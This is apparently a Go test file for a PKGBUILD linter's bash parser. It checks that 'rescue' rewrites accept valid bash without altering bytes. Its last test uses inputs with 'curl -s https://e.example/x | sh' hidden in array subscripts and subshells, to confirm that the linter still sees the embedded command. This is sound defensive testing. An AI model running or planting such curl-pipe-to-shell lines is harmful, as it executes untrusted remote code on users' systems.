package pkgbuild

import (
	"slices"
	"strings"
	"testing"
	"time"

	"mvdan.cc/sh/v3/syntax"
)

// TestRescueArrayWordContinuations covers the upstream lexer gap where `=` and
// `#` directly after an expansion inside array parens end the word: bash keeps
// both as plain word characters. Every case here passes `bash -n`.
func TestRescueArrayWordContinuations(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
		v    string
		want []string
	}{
		{
			name: "provides with unquoted version",
			src:  "_pkgname=ag\npkgver=2.2\nprovides=($_pkgname=$pkgver)\n",
			v:    "provides",
			want: []string{"$_pkgname=$pkgver"},
		},
		{
			name: "braced expansions",
			src:  "provides=(${_pkgname}=${pkgver})\n",
			v:    "provides",
			// RenderWord renders ${x} as $x; the `=` between the two
			// expansions is what the rescue restores.
			want: []string{"$_pkgname=$pkgver"},
		},
		{
			name: "append form across lines",
			src:  "depends=(glibc)\ndepends+=(\n  $_name=$pkgver\n)\n",
			v:    "depends",
			want: []string{"glibc", "$_name=$pkgver"},
		},
		{
			name: "vcs fragment after expansion",
			src:  "source=($pkgname::git+https://example.com/$pkgname#tag=$pkgver)\n",
			v:    "source",
			want: []string{"$pkgname::git+https://example.com/$pkgname#tag=$pkgver"},
		},
		{
			name: "fragment after quoted part",
			src:  "source=(\"$pkgname-$pkgver\"::git+$url#tag=$pkgver)\n",
			v:    "source",
			want: []string{"$pkgname-$pkgver::git+$url#tag=$pkgver"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			pkg := loadPKGBUILD(t, tc.src)
			got := pkg.Vars[tc.v]
			if got == nil {
				t.Fatalf("variable %q not extracted", tc.v)
			}
			if len(got.Values) != len(tc.want) {
				t.Fatalf("values = %q, want %q", got.Values, tc.want)
			}
			for i, w := range tc.want {
				if got.Values[i] != w {
					t.Errorf("values[%d] = %q, want %q", i, got.Values[i], w)
				}
			}
			// The unit must keep the original bytes: findings and --fix edits
			// slice Raw by AST offsets.
			if string(pkg.PKGBUILD.Raw) != tc.src {
				t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
			}
		})
	}
}

// TestRescueAssocSubscript covers string keys in associative-array subscripts,
// which upstream force-parses as arithmetic.
func TestRescueAssocSubscript(t *testing.T) {
	src := "declare -g -A _sums\n" +
		"_sums[7.1]=1b231f3988603dbec4e857e247784295\n" +
		"_sums[7.2]=d9edd2bb89870dc61692e73f81fe0efa\n" +
		"pkgver=7.1.3\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified")
	}
	if v, ok := pkg.Scalar("pkgver"); !ok || v != "7.1.3" {
		t.Errorf("pkgver = %q, %v; want 7.1.3", v, ok)
	}
	// The restored subscript text must survive in the source: printing the
	// statement's span from Raw is how findings quote code.
	if !strings.Contains(string(pkg.PKGBUILD.Raw), "_sums[7.1]=") {
		t.Errorf("subscript text lost from Raw")
	}
}

// TestRescueSubscriptBeforeParamOp covers a string subscript inside a
// parameter expansion that continues with an operator rather than `}`:
// `${_supported[armv8.1-a]:-}`. Passes `bash -n`.
func TestRescueSubscriptBeforeParamOp(t *testing.T) {
	src := "check() {\n  declare -A _supported\n  if [[ -n \"${_supported[armv8.1-a]:-}\" ]]; then\n    :\n  fi\n}\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
	}
	if pkg.PKGBUILD.Functions["check"] == nil {
		t.Errorf("check() not extracted")
	}
	if !strings.Contains(string(pkg.PKGBUILD.Raw), "[armv8.1-a]:-") {
		t.Errorf("subscript text lost from Raw")
	}
}

// TestRescueInlineArray covers `arr+=( x ) cmd`, which bash accepts as an
// assignment in the command's temporary environment.
func TestRescueInlineArray(t *testing.T) {
	src := "build() {\n  local _conf=()\n  _conf+=( '--without-gsettings' ) :\n}\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified")
	}
	if pkg.PKGBUILD.Functions["build"] == nil {
		t.Errorf("build() not extracted")
	}
}

// TestRescueArithFallback covers `$((( cmd )) ...)`: bash retries the failed
// arithmetic parse as a command substitution; upstream reports the unmatched
// `))`. Both cases pass `bash -n`.
func TestRescueArithFallback(t *testing.T) {
	t.Run("configure flag toggle", func(t *testing.T) {
		src := "flag=1\nbuild() {\n  ./configure $((( flag )) && echo --enable-tests)\n}\n"
		pkg := loadPKGBUILD(t, src)
		if string(pkg.PKGBUILD.Raw) != src {
			t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
		}
		if pkg.PKGBUILD.Functions["build"] == nil {
			t.Errorf("build() not extracted")
		}
		// The restored paren text must survive: findings quote code from Raw.
		if !strings.Contains(string(pkg.PKGBUILD.Raw), "$((( flag ))") {
			t.Errorf("arithmetic command text lost from Raw")
		}
	})

	t.Run("assignment form", func(t *testing.T) {
		src := "a=$((( x )) && echo y)\n"
		pkg := loadPKGBUILD(t, src)
		if string(pkg.PKGBUILD.Raw) != src {
			t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
		}
	})

	// Real arithmetic in the same spelling must not round-trip through the
	// rescue: `$(((1+2)*3))` parses as arithmetic on the first attempt.
	t.Run("healthy arithmetic untouched", func(t *testing.T) {
		pkg := loadPKGBUILD(t, "a=$(((1+2)*3))\n")
		if pkg.Vars["a"] == nil {
			t.Fatal("a not extracted")
		}
	})
}

// TestRescueHeredocText covers non-shell text — Markdown code fences, inline
// backquotes — in an unquoted heredoc body. Bash defers the body's expansions
// to when the redirection runs, so `bash -n` accepts this; upstream parses the
// backquote substitution eagerly and fails on its content.
func TestRescueHeredocText(t *testing.T) {
	src := "package() {\n  cat <<EOF\nNotes:\n```\nfoo(s) bar\n```\nUses `file`, see $pkgdir docs.\nEOF\n}\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
	}
	if pkg.PKGBUILD.Functions["package"] == nil {
		t.Errorf("package() not extracted")
	}
	if !strings.Contains(string(pkg.PKGBUILD.Raw), "Uses `file`") {
		t.Errorf("backquote text lost from Raw")
	}
}

// TestRescueGivesUp pins the failure mode: input that bash itself rejects, or
// that the rescue cannot restore faithfully, must surface the original parse
// error rather than a silently divergent AST.
func TestRescueGivesUp(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
	}{
		// bash also rejects this: the comment swallows the closing paren.
		{"comment at element start", "a=(#c)\n"},
		// Unterminated array; nothing to rescue.
		{"unterminated array", "provides=($x=$y\n"},
		// The rewritten `~` would become an arithmetic operator, not a
		// literal, so restoration must veto the rescue.
		{"expansion glued to arith base", "a=$(($x#2))\n"},
		// bash rejects this too: the paren error is outside any heredoc, so
		// no rescue may apply.
		{"paren in ordinary command", "build() {\n  echo task(s)\n}\n"},
		// bash rejects this too: the array literal never closes.
		{"escaped array close", "source=(a\n        b\\)\nsha256sums=('SKIP')\n"},
		// A non-empty bad parameter name is not the `${}` spelling the rescue
		// covers, and must keep the original error.
		{"non-empty bad parameter name", "a=${%x}\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := parseUnit("PKGBUILD", []byte(tc.src), false); err == nil {
				t.Fatalf("parseUnit accepted %q; want the original parse error", tc.src)
			}
		})
	}
}

// TestRescueLeavesHealthyInputAlone: a byte-identical AST question — sources
// with these characters in ordinary positions must not round-trip through the
// rescue at all (strict parse already accepts them).
func TestRescueLeavesHealthyInputAlone(t *testing.T) {
	src := "pkgver=1 # release=$pkgver\nopts=(-Db_lto=true \"x=$pkgver\" 'lit=#')\n"
	pkg := loadPKGBUILD(t, src)
	v := pkg.Vars["opts"]
	if v == nil {
		t.Fatal("opts not extracted")
	}
	want := []string{"-Db_lto=true", "x=$pkgver", "lit=#"}
	for i, w := range want {
		if v.Values[i] != w {
			t.Errorf("values[%d] = %q, want %q", i, v.Values[i], w)
		}
	}
}

// TestRescueAssocArrayElement covers a string key written as an element of an
// array literal — `declare -A m=([2.1.1]=x)` — where the `[` opens a word
// instead of continuing `name[`. Passes `bash -n`.
func TestRescueAssocArrayElement(t *testing.T) {
	src := "declare -gA _binhashes=(\n" +
		"  [2.1.1]='17372d86935f7541ae0bc7ff0b9eebb721af0cb0'\n" +
		"  [2.2]='8e308f25a329e6ac3728a69afdc1ef531a24767c'\n" +
		")\npkgver=2.1.1\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
	}
	if v, ok := pkg.Scalar("pkgver"); !ok || v != "2.1.1" {
		t.Errorf("pkgver = %q, %v; want 2.1.1", v, ok)
	}
	if !strings.Contains(string(pkg.PKGBUILD.Raw), "[2.1.1]=") {
		t.Errorf("subscript text lost from Raw")
	}
}

// TestRescueCmdSubstParen covers `$( (cmd) ... )` written without the
// separating space. Bash retries the failed arithmetic parse as a command
// substitution; upstream commits to arithmetic and rejects the command's
// first word as an operator. Both cases pass `bash -n`.
func TestRescueCmdSubstParen(t *testing.T) {
	t.Run("pipeline into sed", func(t *testing.T) {
		src := "pkgver() {\n  local v=$((git describe --tags || echo v0) | sed 's/^v//')\n  echo $v\n}\n"
		pkg := loadPKGBUILD(t, src)
		if string(pkg.PKGBUILD.Raw) != src {
			t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
		}
		if pkg.PKGBUILD.Functions["pkgver"] == nil {
			t.Errorf("pkgver() not extracted")
		}
		// The restored paren text must survive: findings quote code from Raw.
		if !strings.Contains(string(pkg.PKGBUILD.Raw), "$((git describe") {
			t.Errorf("subshell text lost from Raw")
		}
	})

	t.Run("top-level assignment", func(t *testing.T) {
		src := "pkgver=$((curl -sf 'https://example.com/v' || exit 1) | tr -d ' ')\n"
		pkg := loadPKGBUILD(t, src)
		if string(pkg.PKGBUILD.Raw) != src {
			t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
		}
		if pkg.Vars["pkgver"] == nil {
			t.Fatal("pkgver not extracted")
		}
	})

	// A subshell whose command reads as arithmetic (`(ls) | wc - l` is a
	// valid expression) fails only at the missing `))`, which upstream reports
	// at the construct's `$` rather than inside it.
	t.Run("command that reads as arithmetic", func(t *testing.T) {
		src := "pkgver() {\n  n=$((ls) | wc -l)\n  echo $n\n}\n"
		pkg := loadPKGBUILD(t, src)
		if string(pkg.PKGBUILD.Raw) != src {
			t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
		}
		if pkg.PKGBUILD.Functions["pkgver"] == nil {
			t.Errorf("pkgver() not extracted")
		}
	})

	// Real arithmetic must not round-trip through the rescue: it closes with
	// `))`, which is the discriminator bash itself uses.
	t.Run("healthy arithmetic untouched", func(t *testing.T) {
		pkg := loadPKGBUILD(t, "a=$((1+2))\nb=$(( (1+2) * 3 ))\n")
		for _, v := range []string{"a", "b"} {
			if pkg.Vars[v] == nil {
				t.Errorf("%s not extracted", v)
			}
		}
	})

	// The rewrite is structural and never restored, so it must only touch the
	// construct upstream failed in. A `$((` that is inert text — in a comment,
	// in a single-quoted value — ahead of an unrelated failure (here a heredoc
	// the heredoc rescue recovers) must come through byte-for-byte: rules
	// render those values.
	t.Run("unrelated text untouched", func(t *testing.T) {
		src := "# see $((foo) bar\n_note='$((foo) bar'\n" +
			"package() {\n  cat <<EOF\nNotes:\n```\nfoo(s) bar\n```\nUses `file`, see $pkgdir docs.\nEOF\n}\n"
		pkg := loadPKGBUILD(t, src)
		if v, ok := pkg.Scalar("_note"); !ok || v != "$((foo) bar" {
			t.Errorf("_note = %q, %v; want %q", v, ok, "$((foo) bar")
		}
		var comments []string
		syntax.Walk(pkg.PKGBUILD.File, func(n syntax.Node) bool {
			if c, ok := n.(*syntax.Comment); ok {
				comments = append(comments, c.Text)
			}
			return true
		})
		if !slices.Contains(comments, " see $((foo) bar") {
			t.Errorf("comments = %q, want the original text among them", comments)
		}
	})
}

// TestRescueEmptyExpansion covers `${}`, which bash defers to expansion time
// as a "bad substitution" rather than rejecting while parsing, so `bash -n`
// accepts it and makepkg reads the file's metadata regardless.
func TestRescueEmptyExpansion(t *testing.T) {
	src := "build() {\n  test -s Makefile.inc || echo \"${}\"\n}\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
	}
	if pkg.PKGBUILD.Functions["build"] == nil {
		t.Errorf("build() not extracted")
	}
}

// TestRescueInvalidUTF8 covers a file that is not valid UTF-8. Bash reads
// bytes, not runes: a Latin-1 name in a `# Contributor:` line is a file bash
// parses and upstream refuses to tokenize.
func TestRescueInvalidUTF8(t *testing.T) {
	// "Martin L\xfcthi" — Latin-1, as it appears in the wild.
	src := "# Contributor: Martin L\xfcthi <m@example.net>\npkgname=survex\npkgver=1.4.22\n"
	pkg := loadPKGBUILD(t, src)
	if string(pkg.PKGBUILD.Raw) != src {
		t.Errorf("Raw was modified:\n%q", pkg.PKGBUILD.Raw)
	}
	if v, ok := pkg.Scalar("pkgname"); !ok || v != "survex" {
		t.Errorf("pkgname = %q, %v; want survex", v, ok)
	}
	// An undecodable byte inside a value must come back too, not just in a
	// comment: rules render values into findings.
	pkg = loadPKGBUILD(t, "# \xfc\npkgdesc='caf\xe9 tools'\n")
	if v, ok := pkg.Scalar("pkgdesc"); !ok || v != "caf\xe9 tools" {
		t.Errorf("pkgdesc = %q, %v; want %q", v, ok, "caf\xe9 tools")
	}
}

// TestRescueScalesWithRestoredBytes pins restoreBytes to sub-quadratic time.
// A Latin-1 file puts one restore entry per undecodable byte; this input has
// sixty thousand of them across as many literals, and sweeping the whole map
// once per literal took over a minute here against well under a second now.
// The bound is loose enough for a slow runner under -race and far below the
// quadratic time.
func TestRescueScalesWithRestoredBytes(t *testing.T) {
	src := strings.Repeat("echo \xe9\n", 60000)
	start := time.Now()
	u, err := parseUnit("PKGBUILD", []byte(src), false)
	if err != nil {
		t.Fatal(err)
	}
	if d := time.Since(start); d > 15*time.Second {
		t.Errorf("parse took %v; restoreBytes is sweeping every restored byte per literal again", d)
	}
	if n := len(u.TopLevel); n != 60000 {
		t.Errorf("got %d statements, want 60000", n)
	}
}

// TestRescueDoesNotMaskCommands is the security contract of the rescues: a
// rescued AST must not hide from the rules anything bash would run. Every
// rewrite is a chance to turn an executable construct into inert text, and a
// PKGBUILD that parses only through a rescue is one that chose that spelling.
// So each shape here must either present the command faithfully or refuse the
// rescue outright — a package graded "unscanned" is honest, a package graded
// clean because the linter could not see the payload is not.
func TestRescueDoesNotMaskCommands(t *testing.T) {
	// A subshell's parens become whitespace, never word characters: blanking
	// them to `_` would present the command as `(curl` and no name-matching
	// rule would recognise it.
	t.Run("subshell command word intact", func(t *testing.T) {
		src := "build() {\n  v=$((curl -s https://e.example/x | sh) | tr -d ' ')\n}\n"
		pkg := loadPKGBUILD(t, src)
		var names []string
		syntax.Walk(pkg.PKGBUILD.File, func(n syntax.Node) bool {
			if c, ok := n.(*syntax.CallExpr); ok && len(c.Args) > 0 {
				if lit := c.Args[0].Lit(); lit != "" {
					names = append(names, lit)
				}
			}
			return true
		})
		if !slices.Contains(names, "curl") {
			t.Errorf("command names = %q, want one of them to be exactly \"curl\"", names)
		}
	})

	// An expansion inside an associative-array key runs when bash evaluates
	// the assignment. The rescue would flatten it to literal text, so it must
	// decline and let the original parse error stand.
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"subscript key", "declare -A m\nm[1.2$(curl -s https://e.example/x | sh)]=y\n"},
		{"array element key", "declare -A m=(\n  [1.2$(curl -s https://e.example/x | sh)]=y\n)\n"},
		{"backquoted subscript key", "declare -A m\nm[1.2`curl -s https://e.example/x`]=y\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := parseUnit("PKGBUILD", []byte(tc.src), false); err == nil {
				t.Errorf("parseUnit accepted %q; a key holding an expansion must not be flattened to text", tc.src)
			}
		})
	}
}
